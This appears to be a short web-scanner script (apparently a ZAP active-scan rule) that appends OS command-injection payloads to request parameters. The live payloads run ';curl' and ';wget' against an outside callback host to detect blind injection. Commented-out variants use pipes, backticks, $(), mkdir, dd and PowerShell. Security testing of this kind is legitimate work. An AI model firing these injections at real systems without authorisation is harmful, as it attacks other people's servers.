var attacks = [
	//"\$\(wget https://cloudcmd.mybluemix.net/pinger.php?dollarWget=rodneyrr_XPARAMX_XXXXX\)",
	//"\$\(curl https://cloudcmd.mybluemix.net/pinger.php?dollarCurl=rodneyrr_XPARAMX_XXXXX\)",
	//"\|wget https://cloudcmd.mybluemix.net/pinger.php?pipeWget=rodneyrr_XPARAMX_XXXXX",
	//"\|curl https://cloudcmd.mybluemix.net/pinger.php?pipeCurl=rodneyrr_XPARAMX_XXXXX",
	//"\&wget https://cloudcmd.mybluemix.net/pinger.php?ampWget=rodneyrr_XPARAMX_XXXXX",
	//"\&curl https://cloudcmd.mybluemix.net/pinger.php?ampCurl=rodneyrr_XPARAMX_XXXXX",
	//"`curl https://cloudcmd.mybluemix.net/pinger.php?tickCurl=rodneyrr_XPARAMX_XXXXX`",
	//"`wget https://cloudcmd.mybluemix.net/pinger.php?tickWget=rodneyrr_XPARAMX_XXXXX`",
	";curl https://cloudcmd.mybluemix.net/pinger.php?semiCurl=rodneyrr_XPARAMX_XXXXX",
	";wget https://cloudcmd.mybluemix.net/pinger.php?semiWget=rodneyrr_XPARAMX_XXXXX",
	//"\$\(mkdir /tmp/contactRodneyRyanASAPdollar_XPARAMX_XXXXX\)",
	//"\|mkdir /tmp/contactRodneyRyanASAPpipe_XPARAMX_XXXXX",
	//"`mkdir /tmp/contactRodneyRyanASAPtick_XPARAMX_XXXXX`",
	//";mkdir /tmp/contactRodneyRyanASAPsemi_XPARAMX_XXXXX",
	//"&mkdir /tmp/contactRodneyRyanASAPamp_XPARAMX_XXXXX",
	//"$(dd)",
	//"|dd",
	//"`dd`",
	//";dd",
	//"&dd"
	//";Invoke-RestMethod https://cloudcmd.mybluemix.net/pinger.php?winPS=rodneyrr_XPARAMX_XXXXX"
]

function scan(as, msg, param, value) {
	var i;
	for (i = 0; i < attacks.length; i++) {
		msg = msg.cloneRequest();
		intRandom = Math.floor((Math.random() * 99999) + 1);
		attackVector1 = attacks[i].replace("XXXXX",intRandom);
		attackVector1 = attackVector1.replace("XPARAMX",param);
		print('OSi attackVector: ' + attackVector1);
		as.setParam(msg, param, value + attackVector1);
		as.sendAndReceive(msg, false, false);
	}
}
